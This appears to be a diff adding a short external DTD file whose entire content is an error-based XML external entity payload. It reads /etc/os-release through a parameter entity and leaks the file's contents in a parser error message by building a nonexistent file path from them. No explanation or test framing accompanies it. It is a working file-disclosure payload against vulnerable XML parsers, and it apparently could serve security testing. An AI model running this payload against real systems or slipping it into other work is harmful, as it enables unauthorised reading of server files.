@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/os-release">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notfound/%file;'>">
+%eval;
+%error;
